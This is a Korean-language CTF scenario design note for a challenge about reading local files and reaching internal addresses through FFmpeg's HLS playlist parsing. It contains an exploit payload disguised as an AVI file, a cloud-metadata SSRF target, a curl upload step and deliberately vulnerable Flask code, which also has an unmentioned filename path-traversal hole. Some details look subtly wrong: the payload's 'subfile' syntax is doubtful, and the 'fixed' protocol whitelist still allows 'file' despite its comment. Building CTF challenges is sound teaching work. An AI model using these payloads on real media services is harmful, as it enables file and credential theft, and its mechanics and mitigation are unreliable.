---
title: FFmpeg SSRF/LFI via HLS Playlist Injection — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, ssrf, lfi, ffmpeg, hls, m3u8, media-processing]
confidence: high
---

# FFmpeg SSRF/LFI via HLS Playlist Injection — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Cloud Video Converter (클라우드 동영상 변환기)
- **난이도**: High
- **핵심 컨셉**: 웹 애플리케이션의 미디어 파일 파싱 엔진(FFmpeg)의 취약점을 겨냥하여 내부망 기밀을 빼내는 **SSRF / LFI** 연계형 문제입니다. 사용자는 자신의 비디오 파일(`.mp4`, `.avi`, `.mkv` 등)을 올려 해상도를 바꾸거나 GIF 썸네일로 변환할 수 있습니다. 겉으로는 단순 멀티미디어 파일 업로드 폼이지만, 백엔드는 실질적으로 `FFmpeg` 서브프로세스를 기동하여 연산을 수행합니다. 공격자는 HLS(HTTP Live Streaming) 플레이리스트 규격인 `.m3u8` 형식의 텍스트가 심겨진 악성 미디어 파일을 업로드해, FFmpeg이 내부 동영상 조각을 합칠 때 로컬 기밀 파일(`file:///`)에 접근하여 렌더링 결과 프레임 안에 내용을 각인시키도록 유도하여 탈취합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Portal**: 비디오 파일을 드래그 앤 드롭하고 변환 포맷(GIF 등)을 선택해 내려받는 인터페이스.
- **Backend Service (Node.js with child_process or Python)**:
  - 파일 업로드 및 유효성(확장자) 체크. (단, 비디오 헤더 및 파일 구조 검사만 하고 실제 세부 컴포넌트는 FFmpeg에 위임)
  - 변환 명령 실행: `ffmpeg -i uploads/video.mp4 -t 5 out.gif`
- **Flag 위치**:
  - 서버 파일 시스템 내: `/flag.txt`

### 2.2 취약점 지점
1. **Unrestricted Media Parsing in FFmpeg**:
   - 오래된 버전이나 설정이 부실한 FFmpeg은 HLS 스트리밍 지시어인 `.m3u8` 프로토콜 해석 시 외부 URL 지시 및 로컬 `subfile://` 프로토콜을 그대로 수용합니다.
   - 공격자는 일반 비디오 파일 컨테이너(예: AVI) 내부에 HLS 링크 선언을 조작하여 집어넣음으로써 파일 검사기를 통과하고 FFmpeg의 미디어 결합 파서를 호출합니다.
   - FFmpeg은 가공 과정에서 지정된 로컬 텍스트 파일 `/flag.txt` 내용을 비디오의 자막이나 비디오 프레임 데이터로 읽어 들여 합치게 됩니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Multipart/form-data) | 반환 값 | 비고 |
|------------|--------|------|------------------------------|---------|------|
| `/api/convert`| POST | 없음 | `video` 파일 객체 | GIF 썸네일 파일 스트림 | FFmpeg 가동 및 SSRF/LFI 주입 경로 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. FFmpeg 가동 검증 및 공격 벡터 기획
업로드 기능 테스트를 진행하여 백엔드에서 비디오 가공용으로 `FFmpeg`이 돌고 있는지 에러 로그나 파일 헤더 분석을 통해 식별합니다.

### Step 2. 악성 M3U8 구조를 포함한 AVI 비디오 제작
HLS 규격인 `.m3u8`은 텍스트 플레이리스트 파일이지만, FFmpeg은 특정 미디어 컨테이너(예: AVI, CONCAT)의 헤더 뒤에 HLS 재생 리스트 구조가 오면 이를 해석하는 능력이 있습니다.
- **공격용 HLS 플레이리스트 페이로드 작성 (`exploit.avi` 또는 `exploit.m3u8`)**:
  ```text
  #EXTM3U
  #EXT-X-MEDIA-SEQUENCE:0
  #EXTINF:1.0,
  # FFmpeg이 로컬 시스템의 flag.txt를 서브파일로 렌더링 대상에 추가하도록 구성
  subfile,,start=0,end=100,::/flag.txt
  ```
  *(설명: `subfile` 지시자는 파일 시스템의 특정 물리 경로를 바이너리로 가져와 프레임 합성에 개입시키는 포맷입니다. 원격망의 주소를 가져오려면 `http://169.254.169.254/` 등의 SSRF 주소를 기입합니다.)*

- **AVI 컨테이너 래핑 (선택적)**:
  업로더가 확장자로 `.avi`만 허용한다면, 파일명을 `exploit.avi`로 바꾸고 텍스트를 위 내용으로 채웁니다. FFmpeg은 확장자가 아닌 파일 매직바이트나 내부 규격 해석 우선순위에 따라 HLS로 자동 전환 처리합니다.

### Step 3. 악성 비디오 업로드 요청
공격자는 완성된 `exploit.avi`를 API로 업로드하여 변환(GIF 추출)을 요청합니다.
- *POST 전송 (curl)*:
  ```bash
  curl -X POST http://converter.challenge.local/api/convert \
       -F "video=@exploit.avi"
  ```

### Step 4. flag 획득
서버는 이 파일을 받아 `ffmpeg -i exploit.avi -t 3 out.gif` 명령을 실행합니다. 
FFmpeg은 플레이리스트 지시를 읽어 `/flag.txt` 내용의 첫 100바이트를 비디오 데이터 프레임으로 렌더링 합성을 감행하고, 변환이 완료된 `out.gif` 결과 파일이 브라우저에 표시됩니다. 
공격자는 다운로드받은 GIF 파일을 실행하거나 프레임을 덤프하여, 영상 썸네일 화면 자체에 텍스트 형태로 선명하게 박혀 나온 플래그(`FLAG{ffmpeg_hls_parser_reads_local_files}`)를 해독하여 탈취합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python with FFmpeg Subprocess)

```python
# app.py
from flask import Flask, request, send_file, jsonify
import subprocess
import tempfile
import os

app = Flask(__name__)

@app.route("/api/convert", methods=["POST"])
def convert_video():
    if 'video' not in request.files:
        return "Missing video file", 400
        
    video_file = request.files['video']
    file_name = video_file.filename
    
    # 확장자 검증 (느슨한 검증: avi나 mp4이기만 하면 수용)
    if not file_name.endswith(('.mp4', '.avi', '.mkv')):
        return "Only video files allowed!", 400
        
    temp_dir = tempfile.gettempdir()
    input_path = os.path.join(temp_dir, file_name)
    output_path = os.path.join(temp_dir, "thumbnail.gif")
    
    video_file.save(input_path)
    
    try:
        # 취약점 지점: FFmpeg 실행 시 프로토콜(file, subfile 등) 접근 제한 정책이 없음
        # FFmpeg 구 버전 또는 취약 설정은 파일 내부 HLS 구문을 해석해 내부망/로컬 자원을 불러옴
        cmd = [
            "ffmpeg", "-y", 
            "-i", input_path, 
            "-t", "2", 
            output_path
        ]
        
        # 서브프로세스로 동영상 변환기 실행
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        
        if os.path.exists(output_path):
            return send_file(output_path, mimetype="image/gif")
        else:
            return jsonify({"error": "Conversion failed", "stderr": result.stderr.decode()}), 500
            
    except Exception as e:
        return str(e), 500
    finally:
        # 청소
        if os.path.exists(input_path): os.remove(input_path)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **FFmpeg 실행 시 허용 프로토콜 화이트리스트 지정 (Strict Protocols)**:
   - FFmpeg 실행 명령 작성 시, 인코딩 과정에서 사용할 프로토콜을 명시적으로 제한하는 `-allowed_extensions` 및 `-protocol_whitelist` 파라미터를 추가하여 `file`, `subfile`, `gopher` 등의 접근을 물리적으로 제한합니다.
   - **수정 예시**:
     ```python
     # http, https, tcp 프로토콜 외의 local file 참조(file, subfile)를 컴파일 시 전면 제한
     cmd = [
         "ffmpeg", "-y",
         "-protocol_whitelist", "file,http,https,tcp,tls",
         "-i", input_path,
         "-t", "2",
         output_path
     ]
     ```
2. **미디어 파일 정적 헤더 검사**:
   - 파일의 텍스트 콘텐츠에 `#EXTM3U` 또는 `#EXT-X`와 같은 HLS 관련 문자열이 포맷 안에 숨겨져 있는지 업로드 단계에서 사전 바이너리 체크를 수행하여 드롭시킵니다.
3. **컨테이너화된 격리 가공 (Sandboxing)**:
   - 미디어 변환 모듈은 루트 권한이 완전 제거되고 외부 네트워크와 로컬 주입망이 차단된 일회용 Docker 컨테이너 샌드박스 내부에서 기동되도록 관리 인프라를 분리합니다.
